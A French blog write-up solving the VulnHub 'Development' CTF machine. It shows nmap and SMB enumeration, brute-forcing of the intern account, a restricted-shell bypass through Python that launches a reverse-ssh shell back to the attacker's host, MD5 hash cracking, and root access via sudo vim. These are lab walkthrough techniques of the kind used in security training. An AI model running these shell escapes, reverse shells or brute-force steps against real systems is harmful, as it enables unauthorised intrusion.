---
title: "Solution du CTF Development de VulnHub"
tags: [CTF, VulnHub]
---

[digitalworld.local: DEVELOPMENT](https://vulnhub.com/entry/digitalworldlocal-development,280/) est un CTF proposé sur VulnHub créé par _Donavan_.

## Allo la VM ?
La VM semble avoir du mal à accéder au réseau donc il faut éditer l'entrée grub, modifier la ligne _linux ..._ pour supprimer tout ce qui se trouve à partir de `ro` et remplacer par `rw=/bin/bash`.
On sauve cette configuration avec `F10` pour démarrer l'OS et une fois le shell obtenu on rajoute un utilisateur privilégié :

```bash
useradd -u 0 -g 0 -o -s /bin/bash -d /root devloop
passwd devloop
```

On redémarre la machine en mode normal (sans modifications), on se connecte avec cet utilisateur et on lance `dhclient` pour qu'il récupère une adresse IP via DHCP. C'est parti !

```
Nmap scan report for 192.168.56.119
Host is up (0.00013s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 79072b2c2c4e140ae7b36346c6b3ad16 (RSA)
113/tcp  open  ident?
|_auth-owners: oident
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
8080/tcp open  http-proxy  IIS 6.0
|_http-server-header: IIS 6.0
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 07 Mar 2023 11:53:00 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: "230-57de32091ad69"
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <html>
|     <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
|     </head>
|     <body>
|     <p>Welcome to the Development Page.</p>
|     <br/>
|     <p>There are many projects in this box. View some of these projects at html_pages.</p>
|     <br/>
|     <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
|     <br/>
|     <br/>
|     <br/>
|     <hr>
|     <i>Powered by IIS 6.0</i>
|     </body>
|     <!-- Searching for development secret page... where could it be? -->
|     <!-- Patrick, Head of Development-->
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 07 Mar 2023 11:53:00 GMT
|     Server: IIS 6.0
|     Allow: OPTIONS,HEAD,GET,POST
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 07 Mar 2023 11:53:00 GMT
|     Server: IIS 6.0
|     Content-Length: 302
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>IIS 6.0 Server at localhost6.localdomain6 Port 8080</address>
|_    </body></html>
|_http-title: DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=3/7%Time=6407178D%P=x86_64-suse-linux-gnu%r(G
SF:etRequest,330,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2007\x20Mar\x20
SF:2023\x2011:53:00\x20GMT\r\nServer:\x20IIS\x206\.0\r\nLast-Modified:\x20
SF:Wed,\x2026\x20Dec\x202018\x2001:55:41\x20GMT\r\nETag:\x20\"230-57de3209
SF:1ad69\"\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20560\r\nVary:\x
SF:20Accept-Encoding\r\nConnection:\x20close\r\nContent-Type:\x20text/html
SF:\r\n\r\n<html>\r\n<head><title>DEVELOPMENT\x20PORTAL\.\x20NOT\x20FOR\x2
SF:0OUTSIDERS\x20OR\x20HACKERS!</title>\r\n</head>\r\n<body>\r\n<p>Welcome
SF:\x20to\x20the\x20Development\x20Page\.</p>\r\n<br/>\r\n<p>There\x20are\
SF:x20many\x20projects\x20in\x20this\x20box\.\x20View\x20some\x20of\x20the
SF:se\x20projects\x20at\x20html_pages\.</p>\r\n<br/>\r\n<p>WARNING!\x20We\
SF:x20are\x20experimenting\x20a\x20host-based\x20intrusion\x20detection\x2
SF:0system\.\x20Report\x20all\x20false\x20positives\x20to\x20patrick@goodt
SF:ech\.com\.sg\.</p>\r\n<br/>\r\n<br/>\r\n<br/>\r\n<hr>\r\n<i>Powered\x20
SF:by\x20IIS\x206\.0</i>\r\n</body>\r\n\r\n<!--\x20Searching\x20for\x20dev
SF:elopment\x20secret\x20page\.\.\.\x20where\x20could\x20it\x20be\?\x20-->
SF:\r\n\r\n<!--\x20Patrick,\x20Head\x20of\x20Development-->\r\n\r\n</html>
SF:\r\n")%r(HTTPOptions,A6,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2007\
SF:x20Mar\x202023\x2011:53:00\x20GMT\r\nServer:\x20IIS\x206\.0\r\nAllow:\x
SF:20OPTIONS,HEAD,GET,POST\r\nContent-Length:\x200\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html\r\n\r\n")%r(RTSPRequest,1D5,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2007\x20Mar\x202023\x2011:53:
SF:00\x20GMT\r\nServer:\x20IIS\x206\.0\r\nContent-Length:\x20302\r\nConnec
SF:tion:\x20close\r\nContent-Type:\x20text/html;\x20charset=iso-8859-1\r\n
SF:\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//IETF//DTD\x20HTML\x202\.0//EN\"
SF:>\n<html><head>\n<title>400\x20Bad\x20Request</title>\n</head><body>\n<
SF:h1>Bad\x20Request</h1>\n<p>Your\x20browser\x20sent\x20a\x20request\x20t
SF:hat\x20this\x20server\x20could\x20not\x20understand\.<br\x20/>\n</p>\n<
SF:hr>\n<address>IIS\x206\.0\x20Server\x20at\x20localhost6\.localdomain6\x
SF:20Port\x208080</address>\n</body></html>\n");
MAC Address: 08:00:27:E6:08:3E (Oracle VirtualBox virtual NIC)
Service Info: Host: DEVELOPMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 59m57s, deviation: 0s, median: 59m57s
| smb2-time: 
|   date: 2023-03-07T11:54:30
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: development
|   NetBIOS computer name: DEVELOPMENT\x00
|   Domain name: \x00
|   FQDN: development
|_  System time: 2023-03-07T11:54:30+00:00
```

## Encore la faute de l'interne

Ça fait beaucoup de services, il va falloir démêler le vrai du faux.

Pour commencer j'ai fouillé sur SMB mais cette fois je me suis servi de [enum4linux-ng](https://github.com/cddmp/enum4linux-ng).

Pour éviter de gérer toutes les dépendances du logiciel, on peut cloner le code et générer une image Docker :

```console
$ git clone https://github.com/cddmp/enum4linux-ng
$ docker build enum4linux-ng --tag enum4linux-ng
```

On peut alors la lancer sur notre cible :

```console
$ docker run -t enum4linux-ng -As 192.168.56.119
ENUM4LINUX - next generation (v1.3.1)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 192.168.56.119
[*] Username ......... ''
[*] Random Username .. 'erwkqwxb'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =======================================
|    Listener Scan on 192.168.56.119    |
 =======================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ===========================================
|    SMB Dialect Check on 192.168.56.119    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: true
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 =============================================================
|    Domain Information via SMB session for 192.168.56.119    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DEVELOPMENT
NetBIOS domain name: ''
DNS domain: ''
FQDN: development
Derived membership: workgroup member
Derived domain: unknown

 ===========================================
|    RPC Session Check on 192.168.56.119    |
 ===========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'erwkqwxb', password ''
[H] Rerunning enumeration with user 'erwkqwxb' might give more results

 =====================================================
|    Domain Information via RPC for 192.168.56.119    |
 =====================================================
[+] Domain: WORKGROUP
[+] Domain SID: NULL SID
[+] Membership: workgroup member

 =================================================
|    OS Information via RPC for 192.168.56.119    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Linux/Unix (Samba 4.7.6-Ubuntu)
OS version: '6.1'
OS release: ''
OS build: '0'
Native OS: Windows 6.1
Native LAN manager: Samba 4.7.6-Ubuntu
Platform id: '500'
Server type: '0x809a03'
Server type string: Wk Sv PrQ Unx NT SNT development server (Samba, Ubuntu)

 =======================================
|    Users via RPC on 192.168.56.119    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 1 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 1 user(s) via 'enumdomusers'
[+] After merging user results we have 1 user(s) total:
'1000':
  username: intern
  name: ''
  acb: '0x00000010'
  description: ''

 ========================================
|    Groups via RPC on 192.168.56.119    |
 ========================================
[*] Enumerating local groups
[+] Found 0 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 0 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 0 group(s) via 'enumdomgroups'

 ========================================
|    Shares via RPC on 192.168.56.119    |
 ========================================
[*] Enumerating shares
[+] Found 3 share(s):
IPC$:
  comment: IPC Service (development server (Samba, Ubuntu))
  type: IPC
access:
  comment: ''
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share access
[+] Mapping: DENIED, Listing: N/A
[*] Testing share print$
[+] Mapping: DENIED, Listing: N/A

 ===========================================
|    Policies via RPC for 192.168.56.119    |
 ===========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: None
  Minimum password length: 5
  Maximum password age: 49710 days 6 hours 21 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: 49710 days 6 hours 21 minutes

 ===========================================
|    Printers via RPC for 192.168.56.119    |
 ===========================================
[+] No printers returned (this is not an error)

Completed after 1.04 seconds
```

J'en conviens, ça fait beaucoup d'output pour un utilisateur (`intern`) et un partage inaccessible (`access`).

Comme j'allais faire une pause, j'en ai profité pour lancer un brute-force SMB avec [mon outil maison](https://github.com/devl00p/brute_smb_share).

```console
$ python3 brute_smb_share.py 192.168.56.119 access users.txt tools/wordlists/rockyou.txt 
Success with user intern and password 12345678900987654321
        x64
        W32ALPHA
        W32X86
        tcpdump.txt
        W32PPC
        WIN40
        W32MIPS
        IA64
```

## Echo Héhé

Les identifiants sont aussi acceptés sur SSH mais on tombe sur un shell restreint :

```console
$ ssh intern@192.168.56.119
intern@192.168.56.119's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-34-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar  7 13:32:56 UTC 2023

  System load:  0.63               Processes:              171
  Usage of /:   28.6% of 19.56GB   Users logged in:        1
  Memory usage: 27%                IP address for enp0s17: 192.168.56.119
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

32 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Mar  7 13:32:43 2023 from 192.168.56.1
Congratulations! You tried harder!
Welcome to Development!
Type '?' or 'help' to get the list of allowed commands
intern:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
intern:~$ echo `ls`
*** forbidden syntax -> "echo `ls`"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
```

On parvient rapidement à le bypasser avec la syntaxe `&&` :

```console
intern:~$ echo a&&id
a
uid=1002(intern) gid=1006(intern) groups=1006(intern)
intern:~$ echo a&&env
a
MAIL=/var/mail/intern
USER=intern
SSH_CLIENT=192.168.56.1 52508 22
HOME=/home/intern
SSH_TTY=/dev/pts/0
LOGNAME=intern
TERM=xterm-256color
XDG_SESSION_ID=18
COLUMNS=210
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
XDG_RUNTIME_DIR=/run/user/1002
LANG=en_US.UTF-8
SHELL=/usr/local/bin/lshell
PWD=/home/intern
SSH_CONNECTION=192.168.56.1 52508 192.168.56.119 22
LINES=48
LSHELL_ARGS=['--config', '/etc/lshell.conf']
```

On est face à un `lshell` que l'on a déjà croisé sur d'autres CTFs.
On peut exécuter d'autres commandes depuis Python par exemple :

```console
intern:~$ echo a&&python
a
Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("chmod 755 reverse-sshx64")
0
>>> os.system("./reverse-sshx64 -p 9999 192.168.56.1")
```

J'avais bien sûr mis un [reverse-ssh](https://github.com/Fahrj/reverse-ssh) en écoute au préalable.
Une fois mon reverse shell obtenu je remarque que l'utilisateur a différents fichiers, mais rien qui ne semble vraiment utile.

```console
intern@development:/home/intern$ find . -ls
   786456      4 drwxr-xr-x   6 intern   intern       4096 Mar  7 13:39 .
   786500      4 drwx------   3 intern   intern       4096 Jul 16  2018 ./.gnupg
   786501      4 drwx------   2 intern   intern       4096 Jul 16  2018 ./.gnupg/private-keys-v1.d
   786437   3604 -rwxr-xr-x   1 intern   intern    3690496 Oct 19 20:31 ./reverse-sshx64
   786454      4 drwxrwxrwx   9 intern   intern       4096 Jul 16  2018 ./access
   786495      4 drwxr-xr-x   2 root     root         4096 Jul 15  2018 ./access/x64
   786489      4 drwxr-xr-x   2 root     root         4096 Jul 15  2018 ./access/W32ALPHA
   786484      4 drwxr-xr-x   2 root     root         4096 Jul 15  2018 ./access/W32X86
   786502      4 -rw-rw-r--   1 intern   intern        210 Jul 16  2018 ./access/tcpdump.txt
   786491      4 drwxr-xr-x   2 root     root         4096 Jul 15  2018 ./access/W32PPC
   786476      4 drwxr-xr-x   2 root     root         4096 Jul 15  2018 ./access/WIN40
   786487      4 drwxr-xr-x   2 root     root         4096 Jul 15  2018 ./access/W32MIPS
   786494      4 drwxr-xr-x   2 root     root         4096 Jul 15  2018 ./access/IA64
   786496      4 drwxrwxr-x   3 intern   intern       4096 Jul 15  2018 ./.local
   786497      4 drwx------   3 intern   intern       4096 Jul 15  2018 ./.local/share
   786498      4 drwx------   2 intern   intern       4096 Jul 15  2018 ./.local/share/nano
   786460      4 -rw-r--r--   1 intern   intern        299 Dec 26  2018 ./work.txt
   786458      4 -rw-r--r--   1 intern   intern         46 Dec 26  2018 ./local.txt
   786469      4 drwx------   2 intern   intern       4096 Jul 16  2018 ./.cache
   786506      0 -rw-r--r--   1 intern   intern          0 Jul 16  2018 ./.cache/motd.legal-displayed
   786550      4 -rw-------   1 intern   intern        503 Mar  7 13:39 ./.lhistory
intern@development:/home/intern$ cat ./work.txt
1.      Tell Patrick that shoutbox is not working. We need to revert to the old method to update David about shoutbox. For new, we will use the old director's landing page.

2.      Patrick's start of the third year in this company!

3.      Attend the meeting to discuss if password policy should be relooked at.
intern@development:/home/intern$ cat local.txt 
Congratulations on obtaining a user shell. :)
intern@development:/home/intern$ cat ./access/tcpdump.txt
1. request for rights to perform tcpdump on traffic. we want to monitor network traffic.
2. tcpdump is a useful tool; we should learn how to pipe tcpdump traffic for building up our Security Operations Centre.
```

Il y a des utilisateurs `admin` et `patrick`. Il y a aussi un IDS _OSSEC_ présent sur la machine, ce qui était mentionné dans la description de la VM.

C'est pour cela que j'ai évité d'utiliser un scanner de vulnérabilités.

```
admin:x:1000:1004:DEVELOPMENT:/home/admin:/bin/bash
patrick:x:1001:1005:,,,:/home/patrick:/bin/bash
intern:x:1002:1006::/home/intern:/usr/local/bin/lshell
statd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin
smmta:x:112:115:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:113:116:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
ossec:x:1003:1007::/var/ossec:/bin/false
ossecm:x:1004:1007::/var/ossec:/bin/false
ossecr:x:1005:1007::/var/ossec:/bin/false
oident:x:114:117::/:/usr/sbin/nologin
```

Je vais fouiner du côté de `/var/www/html` :

```
   415329     20 -rw-r--r--   1 www-data www-data    19207 Jul 15  2004 ./developmentsecretpage/license.txt
   415340      4 -rw-r--r--   1 www-data www-data      265 Jun 13  2018 ./developmentsecretpage/warning.php
   415326      4 -rw-r--r--   1 www-data www-data       75 Jul 15  2004 ./developmentsecretpage/header.inc.php
   415330      4 -rw-r--r--   1 www-data www-data      989 Jun 23  2018 ./developmentsecretpage/patrick.php
   415323     16 -rw-r--r--   1 www-data www-data    13801 Jun 14  2018 ./developmentsecretpage/adminlog.php
   415332      4 -rw-r--r--   1 www-data www-data     1382 Jun 14  2018 ./developmentsecretpage/securitynotice.php
   415327      4 -rw-r--r--   1 www-data www-data      516 Jun 23  2018 ./developmentsecretpage/index.php
   415335      4 -rw-r--r--   1 www-data www-data     1919 Jan  4  2006 ./developmentsecretpage/slogin_genpass.php
   415334      4 -rw-r--r--   1 www-data www-data      472 Oct 11  2004 ./developmentsecretpage/slogin.inc.php
   415339      8 -rw-r--r--   1 www-data www-data     7328 Jan  4  2006 ./developmentsecretpage/version.txt
   415331      4 -rw-r--r--   1 www-data www-data     3185 Jan  4  2006 ./developmentsecretpage/readme.txt
   415336     28 -rw-r--r--   1 www-data www-data    25653 Jun 13  2018 ./developmentsecretpage/slogin_lib.inc.php
   415337      4 -rw-r--r--   1 www-data www-data      436 Jun 13  2018 ./developmentsecretpage/slog_users.php
   415324      4 -rwxrwxrwx   1 www-data www-data     1257 Jun 23  2018 ./developmentsecretpage/directortestpagev1.php
   415325      4 -rw-r--r--   1 www-data www-data       71 Jun 14  2018 ./developmentsecretpage/footer.inc.php
   415338      4 -rw-r--r--   1 www-data www-data      165 Jul 11  2018 ./developmentsecretpage/slog_users.txt
   415333      4 -rw-r--r--   1 www-data www-data     1149 Jun 15  2018 ./developmentsecretpage/sitemap.php
   405360      4 -rw-r--r--   1 root     root         1069 Jul 15  2018 ./developmentsecretpage/directortestpagev1.php.save
```

En particulier dans le fichier `slog_users.txt` je trouve des hashes MD5 :

```
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81
patrick, 87e6d56ce79af90dbe07d387d3d0579e
qiu, ee64497098d0926d198f54f6d5431f98
```

Et aussi dans le fichier `securitynotice.php` je trouve le message suivant :

```html
<p> Recently a security audit was conducted in the Development environment. </p>

<p> We found that our developers have been using passwords that resembled dictionary words, and are easily crackable. The most common offenders are:<br/>
1. password<br/>
2. Password<br/>
3. P@ssw0rd<br/>
</p>

<p>(Yes, we know that Number 3 is compliant with our strong password policy, but we found so many copies of this password that it might be as good as junk from a security angle. Please at least use something like P@ssw0rd1...)</p>

<p> Effective today, any <b>permanent</b> staff found with such passwords in the Development environment will be subject to a security remedial training. Also, we will extend the password expiry enforcement of thirty (30) days from heads and above to all permanent staff of the company. The password history will be set to 10, though if you would like, you can always "cycle" through more passwords.</p>

<p> Regards <br/>
Patrick<br/>
Head, Development Network</p>
```

## Salut Patrick (contrepèterie)

Je génère donc un fichier avec des mutations de `P@ssw0rd1`, juste en incrémentant la valeur du nombre.
Je passe ensuite les hashes à _John The Ripper_ avec la liste des mutations et il casse un hash qui correspond aux identifiants `patrick` / `P@ssw0rd25`.

Cet utilisateur peut lancer deux exécutables en tant que root :

```console
patrick@development:~$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
```

Avec Vim on utilisera la commande `:!/bin/bash` pour invoquer un bash. On a alors les droits root :

```console
root@development:/root# cat proof.txt
Congratulations on rooting DEVELOPMENT! :)
```

## Chemins alternatifs

Le brute-force directe du compte `intern` n'était pas forcément la technique attendue. On pouvait résoudre un jeu de piste via le site web.

Ainsi dans le code source de la page d'index on trouve :

```html
<!-- Searching for development secret page... where could it be? -->

<!-- Patrick, Head of Development-->
```

On a aussi une référence à `html_pages`. Cette URL donne un listing de fichiers dont `development.html`. Ce dernier contient ce message :

```html

<html>
<head><title>Security by Obscurity: The Path to DEVELOPMENTSECRETPAGE.</title>
</head>
<body>
<p>Security by obscurity is one of the worst ways one can defend from a cyberattack. This assumes that the adversary is not smart enough to be able to detect weak points in a corporate network.</p>
<p>An example of security by obscurity is in the local of webpages. For instance, IT administrators like to insert backdoors into applications for remote management, sometimes without the project teams knowing.</p>
<p>Once I worked on an implementation whereby the developer added a backdoor which was aptly named "hackersecretpage". It was hilarious because it contained a link to a file upload function, where the hacker installed a VNC viewer to perform remote desktop management!</p>
<p>A pity Patrick claims to be a security advocate, but isn't one. Hence, I shall secretly write in pages to guide hackers to make Patrick learn his lesson the hard way.</p>
</body>

<hr>
<i>Powered by IIS 6.0.</i>

</html>

<!-- You tried harder! Visit ./developmentsecretpage. -->
```

On peut alors se rendre sur `/developmentsecretpage`. Via une énumération web sur ce dossier, on peut trouver un fichier texte `readme` et une `license` pour une appli web référencée sur exploit-db : 
[Simple Text-File Login script (SiTeFiLo) 1.0.6 - File Disclosure / Remote File Inclusion](https://www.exploit-db.com/exploits/7444)

Le site mentionne notamment la présence du fichier texte contenant les hashes utilisateurs.
